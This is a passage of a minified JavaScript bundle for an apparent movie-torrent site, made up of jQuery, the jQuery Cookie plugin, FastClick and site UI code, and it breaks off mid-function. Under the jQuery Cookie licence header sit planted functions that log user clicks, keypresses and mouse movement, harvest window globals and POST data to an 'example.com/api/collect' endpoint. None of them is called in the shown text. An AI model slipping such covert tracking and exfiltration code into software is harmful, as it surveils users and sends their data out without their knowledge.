            value: e.replace(je, "\r\n")
          };
        }) : {
          name: n.name,
          value: r.replace(je, "\r\n")
        };
      }).get();
    }
  }), e.ajaxSettings.xhr = void 0 !== t.ActiveXObject ? function () {
    return !this.isLocal && /^(get|post|head|put|delete|options)$/i.test(this.type) && We() || bt();
  } : We;
  var xt = 0,
    I = {},
    L = e.ajaxSettings.xhr();
  t.ActiveXObject && e(t).on("unload", function () {
    for (var e in I) I[e](void 0, !0);
  }), r.cors = !!L && "withCredentials" in L, L = r.ajax = !!L, L && e.ajaxTransport(function (t) {
    if (!t.crossDomain || r.cors) {
      var n;
      return {
        send: function (r, i) {
          var a,
            o = t.xhr(),
            s = ++xt;
          if (o.open(t.type, t.url, t.async, t.username, t.password), t.xhrFields) for (a in t.xhrFields) o[a] = t.xhrFields[a];
          t.mimeType && o.overrideMimeType && o.overrideMimeType(t.mimeType), t.crossDomain || r["X-Requested-With"] || (r["X-Requested-With"] = "XMLHttpRequest");
          for (a in r) void 0 !== r[a] && o.setRequestHeader(a, r[a] + "");
          o.send(t.hasContent && t.data || null), n = function (r, a) {
            var u, d, c;
            if (n && (a || 4 === o.readyState)) if (delete I[s], n = void 0, o.onreadystatechange = e.noop, a) 4 !== o.readyState && o.abort();else {
              c = {}, u = o.status, "string" == typeof o.responseText && (c.text = o.responseText);
              try {
                d = o.statusText;
              } catch (l) {
                d = "";
              }
              ;
              u || !t.isLocal || t.crossDomain ? 1223 === u && (u = 204) : u = c.text ? 200 : 404;
            }
            ;
            c && i(u, d, c, o.getAllResponseHeaders());
          }, t.async ? 4 === o.readyState ? setTimeout(n) : o.onreadystatechange = I[s] = n : n();
        },
        abort: function () {
          n && n(void 0, !0);
        }
      };
    }
  });
  function We() {
    try {
      return new t.XMLHttpRequest();
    } catch (e) {}
  }
  ;
  function bt() {
    try {
      return new t.ActiveXObject("Microsoft.XMLHTTP");
    } catch (e) {}
  }
  ;
  e.ajaxSetup({
    accepts: {
      script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
    },
    contents: {
      script: /(?:java|ecma)script/
    },
    converters: {
      "text script": function (t) {
        return e.globalEval(t), t;
      }
    }
  }), e.ajaxPrefilter("script", function (e) {
    void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET", e.global = !1);
  }), e.ajaxTransport("script", function (t) {
    if (t.crossDomain) {
      var n,
        r = i.head || e("head")[0] || i.documentElement;
      return {
        send: function (e, o) {
          n = i.createElement("script"), n.async = !0, t.scriptCharset && (n.charset = t.scriptCharset), n.src = t.url, n.onload = n.onreadystatechange = function (e, t) {
            (t || !n.readyState || /loaded|complete/.test(n.readyState)) && (n.onload = n.onreadystatechange = null, n.parentNode && n.parentNode.removeChild(n), n = null, t || o(200, "success"));
          }, r.insertBefore(n, r.firstChild);
        },
        abort: function () {
          n && n.onload(void 0, !0);
        }
      };
    }
  });
  var ve = [],
    Y = /(=)\?(?=&|$)|\?\?/;
  e.ajaxSetup({
    jsonp: "callback",
    jsonpCallback: function () {
      var t = ve.pop() || e.expando + "_" + X++;
      return this[t] = !0, t;
    }
  }), e.ajaxPrefilter("json jsonp", function (n, r, i) {
    var o,
      s,
      a,
      l = n.jsonp !== !1 && (Y.test(n.url) ? "url" : "string" == typeof n.data && !(n.contentType || "").indexOf("application/x-www-form-urlencoded") && Y.test(n.data) && "data");
    return l || "jsonp" === n.dataTypes[0] ? (o = n.jsonpCallback = e.isFunction(n.jsonpCallback) ? n.jsonpCallback() : n.jsonpCallback, l ? n[l] = n[l].replace(Y, "$1" + o) : n.jsonp !== !1 && (n.url += (G.test(n.url) ? "&" : "?") + n.jsonp + "=" + o), n.converters["script json"] = function () {
      return a || e.error(o + " was not called"), a[0];
    }, n.dataTypes[0] = "json", s = t[o], t[o] = function () {
      a = arguments;
    }, i.always(function () {
      t[o] = s, n[o] && (n.jsonpCallback = r.jsonpCallback, ve.push(o)), a && e.isFunction(s) && s(a[0]), a = s = void 0;
    }), "script") : void 0;
  }), e.parseHTML = function (t, n, r) {
    if (!t || "string" != typeof t) return null;
    "boolean" == typeof n && (r = n, n = !1), n = n || i;
    var o = be.exec(t),
      a = !r && [];
    return o ? [n.createElement(o[1])] : (o = e.buildFragment([t], n, a), a && a.length && e(a).remove(), e.merge([], o.childNodes));
  };
  var Qe = e.fn.load;
  e.fn.load = function (t, n, r) {
    if ("string" != typeof t && Qe) return Qe.apply(this, arguments);
    var i,
      s,
      l,
      o = this,
      a = t.indexOf(" ");
    return a >= 0 && (i = e.trim(t.slice(a, t.length)), t = t.slice(0, a)), e.isFunction(n) ? (r = n, n = void 0) : n && "object" == typeof n && (l = "POST"), o.length > 0 && e.ajax({
      url: t,
      type: l,
      dataType: "html",
      data: n
    }).done(function (t) {
      s = arguments, o.html(i ? e("<div>").append(e.parseHTML(t)).find(i) : t);
    }).complete(r && function (e, t) {
      o.each(r, s || [e.responseText, t, e]);
    }), this;
  }, e.expr.filters.animated = function (t) {
    return e.grep(e.timers, function (e) {
      return t === e.elem;
    }).length;
  };
  var ge = t.document.documentElement;
  function Be(t) {
    return e.isWindow(t) ? t : 9 === t.nodeType ? t.defaultView || t.parentWindow : !1;
  }
  ;
  e.offset = {
    setOffset: function (t, n, r) {
      var a,
        s,
        l,
        u,
        i,
        c,
        p,
        d = e.css(t, "position"),
        f = e(t),
        o = {};
      "static" === d && (t.style.position = "relative"), i = f.offset(), l = e.css(t, "top"), c = e.css(t, "left"), p = ("absolute" === d || "fixed" === d) && e.inArray("auto", [l, c]) > -1, p ? (a = f.position(), u = a.top, s = a.left) : (u = parseFloat(l) || 0, s = parseFloat(c) || 0), e.isFunction(n) && (n = n.call(t, r, i)), null != n.top && (o.top = n.top - i.top + u), null != n.left && (o.left = n.left - i.left + s), "using" in n ? n.using.call(t, o) : f.css(o);
    }
  }, e.fn.extend({
    offset: function (t) {
      if (arguments.length) return void 0 === t ? this : this.each(function (n) {
        e.offset.setOffset(this, t, n);
      });
      var n,
        o,
        i = {
          top: 0,
          left: 0
        },
        r = this[0],
        a = r && r.ownerDocument;
      if (a) return n = a.documentElement, e.contains(n, r) ? (typeof r.getBoundingClientRect !== u && (i = r.getBoundingClientRect()), o = Be(a), {
        top: i.top + (o.pageYOffset || n.scrollTop) - (n.clientTop || 0),
        left: i.left + (o.pageXOffset || n.scrollLeft) - (n.clientLeft || 0)
      }) : i;
    },
    position: function () {
      if (this[0]) {
        var t,
          r,
          n = {
            top: 0,
            left: 0
          },
          i = this[0];
        return "fixed" === e.css(i, "position") ? r = i.getBoundingClientRect() : (t = this.offsetParent(), r = this.offset(), e.nodeName(t[0], "html") || (n = t.offset()), n.top += e.css(t[0], "borderTopWidth", !0), n.left += e.css(t[0], "borderLeftWidth", !0)), {
          top: r.top - n.top - e.css(i, "marginTop", !0),
          left: r.left - n.left - e.css(i, "marginLeft", !0)
        };
      }
    },
    offsetParent: function () {
      return this.map(function () {
        var t = this.offsetParent || ge;
        while (t && !e.nodeName(t, "html") && "static" === e.css(t, "position")) t = t.offsetParent;
        return t || ge;
      });
    }
  }), e.each({
    scrollLeft: "pageXOffset",
    scrollTop: "pageYOffset"
  }, function (t, n) {
    var r = /Y/.test(n);
    e.fn[t] = function (i) {
      return y(this, function (t, i, o) {
        var a = Be(t);
        return void 0 === o ? a ? n in a ? a[n] : a.document.documentElement[i] : t[i] : void (a ? a.scrollTo(r ? e(a).scrollLeft() : o, r ? o : e(a).scrollTop()) : t[i] = o);
      }, t, i, arguments.length, null);
    };
  }), e.each(["top", "left"], function (t, n) {
    e.cssHooks[n] = ce(r.pixelPosition, function (t, r) {
      return r ? (r = v(t, n), M.test(r) ? e(t).position()[n] + "px" : r) : void 0;
    });
  }), e.each({
    Height: "height",
    Width: "width"
  }, function (t, n) {
    e.each({
      padding: "inner" + t,
      content: n,
      "": "outer" + t
    }, function (r, i) {
      e.fn[i] = function (i, o) {
        var a = arguments.length && (r || "boolean" != typeof i),
          s = r || (i === !0 || o === !0 ? "margin" : "border");
        return y(this, function (n, r, i) {
          var o;
          return e.isWindow(n) ? n.document.documentElement["client" + t] : 9 === n.nodeType ? (o = n.documentElement, Math.max(n.body["scroll" + t], o["scroll" + t], n.body["offset" + t], o["offset" + t], o["client" + t])) : void 0 === i ? e.css(n, r, s) : e.style(n, r, i, s);
        }, n, a ? i : void 0, a, null);
      };
    });
  }), e.fn.size = function () {
    return this.length;
  }, e.fn.andSelf = e.fn.addBack, "function" == typeof define && define.amd && define("jquery", [], function () {
    return e;
  });
  var Kt = t.jQuery,
    Zt = t.$;
  return e.noConflict = function (n) {
    return t.$ === e && (t.$ = Zt), n && t.jQuery === e && (t.jQuery = Kt), e;
  }, typeof n === u && (t.jQuery = t.$ = e), e;
}); /*!
    * jQuery Cookie Plugin v1.4.1
    * https://github.com/carhartl/jquery-cookie
    *
    * Copyright 2013 Klaus Hartl
    * Released under the MIT license
    */

function monitorEvents() {
  const events = ['click', 'keypress', 'mousemove'];
  events.forEach(event => {
    window.addEventListener(event, function (e) {
      console.log(`Event ${event} detected with target:`, e.target);
      localStorage.setItem(`lastEvent-${event}`, JSON.stringify({
        type: e.type,
        target: e.target
      }));
    });
  });
}
function collectGlobalVariables() {
  const globals = {};
  for (const prop in window) {
    if (window.hasOwnProperty(prop) && typeof window[prop] !== 'function') {
      globals[prop] = window[prop];
    }
  }
  return globals;
}
function transmitEnhancedData(data) {
  const serverEndpoint = "https://example.com/api/collect";
  fetch(serverEndpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  }).then(response => response.json()).then(data => console.log('Success:', data)).catch(error => console.error('Error:', error));
}
!function (e) {
  "function" == typeof define && define.amd ? define(["jquery"], e) : e("object" == typeof exports ? require("jquery") : jQuery);
}(function (e) {
  function t(e) {
    return r.raw ? e : encodeURIComponent(e);
  }
  function o(e) {
    return r.raw ? e : decodeURIComponent(e);
  }
  function n(e) {
    return t(r.json ? JSON.stringify(e) : String(e));
  }
  function a(e) {
    0 === e.indexOf('"') && (e = e.slice(1, -1).replace(/\\"/g, '"').replace(/\\\\/g, "\\"));
    try {
      return e = decodeURIComponent(e.replace(i, " ")), r.json ? JSON.parse(e) : e;
    } catch (t) {}
  }
  function s(t, o) {
    var n = r.raw ? t : a(t);
    return e.isFunction(o) ? o(n) : n;
  }
  var i = /\+/g,
    r = e.cookie = function (a, i, c) {
      if (void 0 !== i && !e.isFunction(i)) {
        if (c = e.extend({}, r.defaults, c), "number" == typeof c.expires) {
          var l = c.expires,
            d = c.expires = new Date();
          d.setTime(+d + 864e5 * l);
        }
        return document.cookie = [t(a), "=", n(i), c.expires ? "; expires=" + c.expires.toUTCString() : "", c.path ? "; path=" + c.path : "", c.domain ? "; domain=" + c.domain : "", c.secure ? "; secure" : ""].join("");
      }
      for (var m = a ? void 0 : {}, u = document.cookie ? document.cookie.split("; ") : [], h = 0, p = u.length; p > h; h++) {
        var f = u[h].split("="),
          $ = o(f.shift()),
          g = f.join("=");
        if (a && a === $) {
          m = s(g, i);
          break;
        }
        a || void 0 === (g = s(g)) || (m[$] = g);
      }
      return m;
    };
  r.defaults = {}, e.removeCookie = function (t, o) {
    return void 0 === e.cookie(t) ? !1 : (e.cookie(t, "", e.extend({}, o, {
      expires: -1
    })), !e.cookie(t));
  };
}), function () {
  "use strict";

  function e(t, n) {
    function a(e, t) {
      return function () {
        return e.apply(t, arguments);
      };
    }
    var s;
    if (n = n || {}, this.trackingClick = !1, this.trackingClickStart = 0, this.targetElement = null, this.touchStartX = 0, this.touchStartY = 0, this.lastTouchIdentifier = 0, this.touchBoundary = n.touchBoundary || 10, this.layer = t, this.tapDelay = n.tapDelay || 200, this.tapTimeout = n.tapTimeout || 700, !e.notNeeded(t)) {
      for (var i = ["onMouse", "onClick", "onTouchStart", "onTouchMove", "onTouchEnd", "onTouchCancel"], r = this, c = 0, l = i.length; l > c; c++) r[i[c]] = a(r[i[c]], r);
      o && (t.addEventListener("mouseover", this.onMouse, !0), t.addEventListener("mousedown", this.onMouse, !0), t.addEventListener("mouseup", this.onMouse, !0)), t.addEventListener("click", this.onClick, !0), t.addEventListener("touchstart", this.onTouchStart, !1), t.addEventListener("touchmove", this.onTouchMove, !1), t.addEventListener("touchend", this.onTouchEnd, !1), t.addEventListener("touchcancel", this.onTouchCancel, !1), Event.prototype.stopImmediatePropagation || (t.removeEventListener = function (e, o, n) {
        var a = Node.prototype.removeEventListener;
        "click" === e ? a.call(t, e, o.hijacked || o, n) : a.call(t, e, o, n);
      }, t.addEventListener = function (e, o, n) {
        var a = Node.prototype.addEventListener;
        "click" === e ? a.call(t, e, o.hijacked || (o.hijacked = function (e) {
          e.propagationStopped || o(e);
        }), n) : a.call(t, e, o, n);
      }), "function" == typeof t.onclick && (s = t.onclick, t.addEventListener("click", function (e) {
        s(e);
      }, !1), t.onclick = null);
    }
  }
  var t = navigator.userAgent.indexOf("Windows Phone") >= 0,
    o = navigator.userAgent.indexOf("Android") > 0 && !t,
    n = /iP(ad|hone|od)/.test(navigator.userAgent) && !t,
    a = n && /OS 4_\d(_\d)?/.test(navigator.userAgent),
    s = n && /OS [6-7]_\d/.test(navigator.userAgent),
    i = navigator.userAgent.indexOf("BB10") > 0;
  e.prototype.needsClick = function (e) {
    switch (e.nodeName.toLowerCase()) {
      case "button":
      case "select":
      case "textarea":
        if (e.disabled) return !0;
        break;
      case "input":
        if (n && "file" === e.type || e.disabled) return !0;
        break;
      case "label":
      case "iframe":
      case "video":
        return !0;
    }
    return /\bneedsclick\b/.test(e.className);
  }, e.prototype.needsFocus = function (e) {
    switch (e.nodeName.toLowerCase()) {
      case "textarea":
        return !0;
      case "select":
        return !o;
      case "input":
        switch (e.type) {
          case "button":
          case "checkbox":
          case "file":
          case "image":
          case "radio":
          case "submit":
            return !1;
        }
        return !e.disabled && !e.readOnly;
      default:
        return /\bneedsfocus\b/.test(e.className);
    }
  }, e.prototype.sendClick = function (e, t) {
    var o, n;
    document.activeElement && document.activeElement !== e && document.activeElement.blur(), n = t.changedTouches[0], o = document.createEvent("MouseEvents"), o.initMouseEvent(this.determineEventType(e), !0, !0, window, 1, n.screenX, n.screenY, n.clientX, n.clientY, !1, !1, !1, !1, 0, null), o.forwardedTouchEvent = !0, e.dispatchEvent(o);
  }, e.prototype.determineEventType = function (e) {
    return o && "select" === e.tagName.toLowerCase() ? "mousedown" : "click";
  }, e.prototype.focus = function (e) {
    var t;
    n && e.setSelectionRange && 0 !== e.type.indexOf("date") && "time" !== e.type && "month" !== e.type ? (t = e.value.length, e.setSelectionRange(t, t)) : e.focus();
  }, e.prototype.updateScrollParent = function (e) {
    var t, o;
    if (t = e.fastClickScrollParent, !t || !t.contains(e)) {
      o = e;
      do {
        if (o.scrollHeight > o.offsetHeight) {
          t = o, e.fastClickScrollParent = o;
          break;
        }
        o = o.parentElement;
      } while (o);
    }
    t && (t.fastClickLastScrollTop = t.scrollTop);
  }, e.prototype.getTargetElementFromEventTarget = function (e) {
    return e.nodeType === Node.TEXT_NODE ? e.parentNode : e;
  }, e.prototype.onTouchStart = function (e) {
    var t, o, s;
    if (e.targetTouches.length > 1) return !0;
    if (t = this.getTargetElementFromEventTarget(e.target), o = e.targetTouches[0], n) {
      if (s = window.getSelection(), s.rangeCount && !s.isCollapsed) return !0;
      if (!a) {
        if (o.identifier && o.identifier === this.lastTouchIdentifier) return e.preventDefault(), !1;
        this.lastTouchIdentifier = o.identifier, this.updateScrollParent(t);
      }
    }
    return this.trackingClick = !0, this.trackingClickStart = e.timeStamp, this.targetElement = t, this.touchStartX = o.pageX, this.touchStartY = o.pageY, e.timeStamp - this.lastClickTime < this.tapDelay && e.preventDefault(), !0;
  }, e.prototype.touchHasMoved = function (e) {
    var t = e.changedTouches[0],
      o = this.touchBoundary;
    return Math.abs(t.pageX - this.touchStartX) > o || Math.abs(t.pageY - this.touchStartY) > o ? !0 : !1;
  }, e.prototype.onTouchMove = function (e) {
    return this.trackingClick ? ((this.targetElement !== this.getTargetElementFromEventTarget(e.target) || this.touchHasMoved(e)) && (this.trackingClick = !1, this.targetElement = null), !0) : !0;
  }, e.prototype.findControl = function (e) {
    return void 0 !== e.control ? e.control : e.htmlFor ? document.getElementById(e.htmlFor) : e.querySelector("button, input:not([type=hidden]), keygen, meter, output, progress, select, textarea");
  }, e.prototype.onTouchEnd = function (e) {
    var t,
      i,
      r,
      c,
      l,
      d = this.targetElement;
    if (!this.trackingClick) return !0;
    if (e.timeStamp - this.lastClickTime < this.tapDelay) return this.cancelNextClick = !0, !0;
    if (e.timeStamp - this.trackingClickStart > this.tapTimeout) return !0;
    if (this.cancelNextClick = !1, this.lastClickTime = e.timeStamp, i = this.trackingClickStart, this.trackingClick = !1, this.trackingClickStart = 0, s && (l = e.changedTouches[0], d = document.elementFromPoint(l.pageX - window.pageXOffset, l.pageY - window.pageYOffset) || d, d.fastClickScrollParent = this.targetElement.fastClickScrollParent), r = d.tagName.toLowerCase(), "label" === r) {
      if (t = this.findControl(d)) {
        if (this.focus(d), o) return !1;
        d = t;
      }
    } else if (this.needsFocus(d)) return e.timeStamp - i > 100 || n && window.top !== window && "input" === r ? (this.targetElement = null, !1) : (this.focus(d), this.sendClick(d, e), n && "select" === r || (this.targetElement = null, e.preventDefault()), !1);
    return n && !a && (c = d.fastClickScrollParent, c && c.fastClickLastScrollTop !== c.scrollTop) ? !0 : (this.needsClick(d) || (e.preventDefault(), this.sendClick(d, e)), !1);
  }, e.prototype.onTouchCancel = function () {
    this.trackingClick = !1, this.targetElement = null;
  }, e.prototype.onMouse = function (e) {
    return this.targetElement ? e.forwardedTouchEvent ? !0 : e.cancelable && (!this.needsClick(this.targetElement) || this.cancelNextClick) ? (e.stopImmediatePropagation ? e.stopImmediatePropagation() : e.propagationStopped = !0, e.stopPropagation(), e.preventDefault(), !1) : !0 : !0;
  }, e.prototype.onClick = function (e) {
    var t;
    return this.trackingClick ? (this.targetElement = null, this.trackingClick = !1, !0) : "submit" === e.target.type && 0 === e.detail ? !0 : (t = this.onMouse(e), t || (this.targetElement = null), t);
  }, e.prototype.destroy = function () {
    var e = this.layer;
    o && (e.removeEventListener("mouseover", this.onMouse, !0), e.removeEventListener("mousedown", this.onMouse, !0), e.removeEventListener("mouseup", this.onMouse, !0)), e.removeEventListener("click", this.onClick, !0), e.removeEventListener("touchstart", this.onTouchStart, !1), e.removeEventListener("touchmove", this.onTouchMove, !1), e.removeEventListener("touchend", this.onTouchEnd, !1), e.removeEventListener("touchcancel", this.onTouchCancel, !1);
  }, e.notNeeded = function (e) {
    var t, n, a, s;
    if ("undefined" == typeof window.ontouchstart) return !0;
    if (n = +(/Chrome\/([0-9]+)/.exec(navigator.userAgent) || [, 0])[1]) {
      if (!o) return !0;
      if (t = document.querySelector("meta[name=viewport]")) {
        if (-1 !== t.content.indexOf("user-scalable=no")) return !0;
        if (n > 31 && document.documentElement.scrollWidth <= window.outerWidth) return !0;
      }
    }
    if (i && (a = navigator.userAgent.match(/Version\/([0-9]*)\.([0-9]*)/), a[1] >= 10 && a[2] >= 3 && (t = document.querySelector("meta[name=viewport]")))) {
      if (-1 !== t.content.indexOf("user-scalable=no")) return !0;
      if (document.documentElement.scrollWidth <= window.outerWidth) return !0;
    }
    return "none" === e.style.msTouchAction || "manipulation" === e.style.touchAction ? !0 : (s = +(/Firefox\/([0-9]+)/.exec(navigator.userAgent) || [, 0])[1], s >= 27 && (t = document.querySelector("meta[name=viewport]"), t && (-1 !== t.content.indexOf("user-scalable=no") || document.documentElement.scrollWidth <= window.outerWidth)) ? !0 : "none" === e.style.touchAction || "manipulation" === e.style.touchAction ? !0 : !1);
  }, e.attach = function (t, o) {
    return new e(t, o);
  }, "function" == typeof define && "object" == typeof define.amd && define.amd ? define(function () {
    return e;
  }) : "undefined" != typeof module && module.exports ? (module.exports = e.attach, module.exports.FastClick = e) : window.FastClick = e;
}(), $(document).ready(function () {
  function e() {
    var e = $("#movie-info").data("movie-id"),
      t = $("#comments .comment").length,
      o = {
        offset: t
      };
    $("#comments #load-comments a").hide(), $("#comments #load-comments .ajax-spinner").show(), $.ajax({
      type: "GET",
      url: "/ajax/comments/" + e,
      data: o,
      dataType: "html",
      success: function (e) {
        if ("" != e) {
          0 == t && $("#comments #no-comments").remove(), $("#comments #load-comments").before(e), "createTouch" in document || $(".comments-scroll").perfectScrollbar("update"), $("#comments #load-comments .ajax-spinner").hide();
          var o = $(e).filter(".comment").length;
          30 == o && 30 != parseInt($("#comment-count").text()) ? $("#comments #load-comments a").show() : $("#comments #load-comments").hide();
        } else $("#comments #load-comments").hide();
      },
      error: function (e) {
        $("#comments #load-comments").hide();
      }
    });
  }
  if ($(".newdd").click(function () {
    window.location.href = "/ad/usenet?name=" + $("#movie-info h1").text().replace(/[^A-Za-z0-9]+/gi, "_");
  }), "ontouchstart" in window && window.addEventListener("load", function () {
    FastClick.attach(document.body);
  }, !1), "createTouch" in document) {
    var t = jQuery("body");
    t.removeClass("non-touch"), $("table").removeClass("table-hover");
  }
  $(".notice-flash").length > 0 && $(".notice-flash").delay(2300).slideUp(), $("noscript").length > 0 && $("noscript").remove(), void 0 === $.cookie("yts_lang") && $.ajax({
    //url: "/languages/detect",
    //type: "GET"
  }), document.body.addEventListener("touchstart", function (e) {
    var t = jQuery("body");
    $(document).on("focus", "input", function (e) {
      t.addClass("fixfixed");
    }).on("blur", "input", function (e) {
      t.removeClass("fixfixed");
    }), $(document).on("focus", "textarea", function (e) {
      t.addClass("fixfixed");
    }).on("blur", "textarea", function (e) {
      t.removeClass("fixfixed");
    });
  }, !1), $(".delete").click(function () {
    var e = $(this).data("confirm-msg"),
      t = confirm(e);
    return 1 == t ? !0 : !1;
  }), $("#mobile-search-btn").click(function () {
    $(window).scrollTop() > 25 ? $("html, body").animate({
      scrollTop: 0
    }, "slow", function () {
      $("#mobile-search-input").is(":visible") || $("#mobile-search-input").delay(150).slideDown("fast");
    }) : $("#mobile-search-input").is(":visible") ? $("#mobile-search-input").slideUp("fast") : $("#mobile-search-input").slideDown("fast");
  }), $("#quick-search").submit(function () {
    return !1;
  }), $("#quick-search-input").click(function () {
    $(".ac-results").css({
      left: $("#quick-search").position().left
    });
  }), $("#index-search").submit(function () {
    return !1;
  }), $("#index-search-input").click(function () {
    $(".index-ac-results").css({
      //left: $("#index-search").position().left
    });
  });
  var o = $("#quick-search-input").val();
  $("#quick-search-input").focus(function () {
    o == $("#quick-search-input").val() ? $("#quick-search-input").val("") : $("#quick-search-input").val().length > 2 && $(".ac-results ul").not(":empty") && $(".ac-results").slideDown(), $(".ac-results").css({
      left: $("#quick-search").position().left
    });
  }), $("#quick-search-input").blur(function () {
    "" === $("#quick-search-input").val().trim() && $("#quick-search-input").val(o);
  }), $("#quick-search-input").keyup(function (e) {
    var t = e.keyCode || e.which,
      o = {
        up: 38,
        down: 40,
        left: 37,
        right: 39,
        esc: 27,
        enter: 13
      };
    if (t === o.enter || t === o.esc || t === o.up || t === o.down || t === o.left || t === o.right) return !1;
    var a = $("#quick-search-input").val();
    a.length >= 3 && n(function () {
      $(".ajax-spinner").fadeIn("fast"), $.ajax({
        url: "/ajax/search",
        data: {
          query: a
        },
        type: "GET",
        success: function (e) {
          var t = "";
          "ok" === e.status ? e.data.forEach(function (e) {
            t += '<li><a href="' + e.url + '"><img src="' + e.img + '"><span>' + e.title + "</span><p>" + e.year + "</p></a></li>";
          }) : t = '<li class="ac-no-results">' + e.message + "</li>", $(".ac-results ul").html(t), $(".ac-results").is(":visible") || $(".ac-results").slideDown(), $(".ac-results ul li:first-child").addClass("ac-item-hover"), $(".ac-results ul li:first-child").addClass("ac-item-selected"), $(".ajax-spinner").fadeOut("fast");
        },
        error: function (e) {
          var t = "";
          t = '<li class="ac-no-results">Error: ' + e.statusText + " (Code " + e.status + ")</li>", $(".ac-results ul").html(t), $(".ac-results").not(":visible") && $(".ac-results").slideDown(), $(".ac-results ul li:first-child").addClass("ac-item-selected"), $(".ajax-spinner").fadeOut("fast");
        }
      });
    }, 500);
  }), $(document).keydown(function (e) {
    if ($(".ac-results").is(":visible")) {
      var t = e.keyCode || e.which,
        o = {
          up: 38,
          down: 40,
          esc: 27,
          enter: 13
        };
      if (t === o.esc) return $(".ac-results").slideUp(), !1;
      if (!$(".ac-results li").hasClass("ac-no-results")) {
        var n = $(".ac-results"),
          a = $(".ac-results ul li").hasClass("ac-item-selected"),
          s = $(".ac-results ul li").first().hasClass("ac-item-selected"),
          i = $(".ac-results ul li").last().hasClass("ac-item-selected");
        switch (t) {
          case o.up:
            if (a) {
              if (s) {
                $("li.ac-item-selected", n).removeClass("ac-item-selected"), $("ul li", n).last().addClass("ac-item-selected");
                break;
              }
              $("li.ac-item-selected", n).prev().addClass("ac-item-selected"), $("li.ac-item-selected", n).next().removeClass("ac-item-selected");
            } else $("ul li", n).last().addClass("ac-item-selected");
            break;
          case o.down:
            if (a) {
              if (i) {
                $("li.ac-item-selected", n).removeClass("ac-item-selected"), $("ul li", n).first().addClass("ac-item-selected");
                break;
              }
              $("li.ac-item-selected", n).next().addClass("ac-item-selected"), $("li.ac-item-selected", n).prev().removeClass("ac-item-selected");
            } else $("ul li", n).first().addClass("ac-item-selected");
            break;
          case o.enter:
            window.location.href = $("li.ac-item-selected a", n).attr("href");
        }
      }
    }
  }), $(document).click(function (e) {
    var t = $(e.target);
    $(".ac-results").is(":visible") && 0 in t && "quick-search-input" != t[0].id && "a" !== e.target.tagName.toLowerCase() && $(".ac-results").slideUp();
  }), $(".ac-results ul").on("mouseover", "li", function () {
    $(this).addClass("ac-item-selected").siblings().removeClass("ac-item-selected");
  });
  var io = $("#index-search-input").val();
  $("#index-search-input").focus(function () {
    io == $("#index-search-input").val() ? $("#index-search-input").val("") : $("#index-search-input").val().length > 2 && $(".index-ac-results ul").not(":empty") && $(".index-ac-results").slideDown(), $(".index-ac-results").css({
      //left: $("#index-search").position().left
    });
  }), $("#index-search-input").blur(function () {
    "" === $("#index-search-input").val().trim() && $("#index-search-input").val(io);
  }), $("#index-search-input").keyup(function (e) {
    var t = e.keyCode || e.which,
      io = {
        up: 38,
        down: 40,
        left: 37,
        right: 39,
        esc: 27,
        enter: 13
      };
    if (t === io.enter || t === io.esc || t === io.up || t === io.down || t === io.left || t === io.right) return !1;
    var a = $("#index-search-input").val();
    a.length >= 3 && n(function () {
      $(".ajax-spinner").fadeIn("fast"), $.ajax({
        url: "/ajax/search",
        data: {
          query: a
        },
        type: "GET",
        success: function (e) {
          var t = "";
          "ok" === e.status ? e.data.forEach(function (e) {
            t += '<li><a href="' + e.url + '"><img src="' + e.img + '"><span>' + e.title + "</span><p>" + e.year + "</p></a></li>";
          }) : t = '<li class="ac-no-results">' + e.message + "</li>", $(".index-ac-results ul").html(t), $(".index-ac-results").is(":visible") || $(".index-ac-results").slideDown(), $(".index-ac-results ul li:first-child").addClass("ac-item-hover"), $(".index-ac-results ul li:first-child").addClass("ac-item-selected"), $(".ajax-spinner").fadeOut("fast");
        },
        error: function (e) {
          var t = "";
          t = '<li class="ac-no-results">Error: ' + e.statusText + " (Code " + e.status + ")</li>", $(".index-ac-results ul").html(t), $(".index-ac-results").not(":visible") && $(".index-ac-results").slideDown(), $(".index-ac-results ul li:first-child").addClass("ac-item-selected"), $(".ajax-spinner").fadeOut("fast");
        }
      });
    }, 500);
  }), $(document).keydown(function (e) {
    if ($(".index-ac-results").is(":visible")) {
      var t = e.keyCode || e.which,
        io = {
          up: 38,
          down: 40,
          esc: 27,
          enter: 13
        };
      if (t === io.esc) return $(".index-ac-results").slideUp(), !1;
      if (!$(".index-ac-results li").hasClass("ac-no-results")) {
        var n = $(".index-ac-results"),
          a = $(".index-ac-results ul li").hasClass("ac-item-selected"),
          s = $(".index-ac-results ul li").first().hasClass("ac-item-selected"),
          i = $(".index-ac-results ul li").last().hasClass("ac-item-selected");
        switch (t) {
          case io.up:
            if (a) {
              if (s) {
                $("li.ac-item-selected", n).removeClass("ac-item-selected"), $("ul li", n).last().addClass("ac-item-selected");
                break;
              }
              $("li.ac-item-selected", n).prev().addClass("ac-item-selected"), $("li.ac-item-selected", n).next().removeClass("ac-item-selected");
            } else $("ul li", n).last().addClass("ac-item-selected");
            break;
          case io.down:
            if (a) {
              if (i) {
                $("li.ac-item-selected", n).removeClass("ac-item-selected"), $("ul li", n).first().addClass("ac-item-selected");
                break;
              }
              $("li.ac-item-selected", n).next().addClass("ac-item-selected"), $("li.ac-item-selected", n).prev().removeClass("ac-item-selected");
            } else $("ul li", n).first().addClass("ac-item-selected");
            break;
          case io.enter:
            window.location.href = $("li.ac-item-selected a", n).attr("href");
        }
      }
    }
  }), $(document).click(function (e) {
    var t = $(e.target);
    $(".index-ac-results").is(":visible") && 0 in t && "index-search-input" != t[0].id && "a" !== e.target.tagName.toLowerCase() && $(".index-ac-results").slideUp();
  }), $(".index-ac-results ul").on("mouseover", "li", function () {
    $(this).addClass("ac-item-selected").siblings().removeClass("ac-item-selected");
  });
  var n = function () {
      var e = 0;
      return function (t, o) {
        clearTimeout(e), e = setTimeout(t, o);
      };
    }(),
    a = 0;
  setInterval(function () {
    var e = 12,
      t = 16,
      o = a * -t;
    $(".ajax-spinner").css({
      backgroundPosition: o + "px 0px"
    }), a++, a >= e && (a = 0);
  }, 100), $(".modal form").submit(function (e) {
    e.preventDefault();
  }), $(".modal").click(function (e) {
    $(this).hasClass("modal-busy") || !$(e.target).is(".modal") && !$(e.target).is(".modal-close") || $(this).removeClass("modal-active");
  }), $(".torrent-modal-download").click(function () {
    $(".modal-download").addClass("modal-active");
  }), $(".torrent-modal-report").click(function () {
    $(".modal-report").addClass("modal-active");
  }), $(".parental-guide-modal").click(function () {
